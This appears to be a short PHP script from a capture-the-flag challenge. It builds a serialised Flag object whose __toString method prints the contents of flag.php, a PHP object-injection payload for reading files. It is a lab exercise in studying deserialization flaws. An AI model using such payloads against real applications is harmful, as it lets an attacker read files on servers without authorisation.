<?php  
class Flag{  //flag.php  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}
$a = new Flag();
echo serialize($a);
// O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
?>  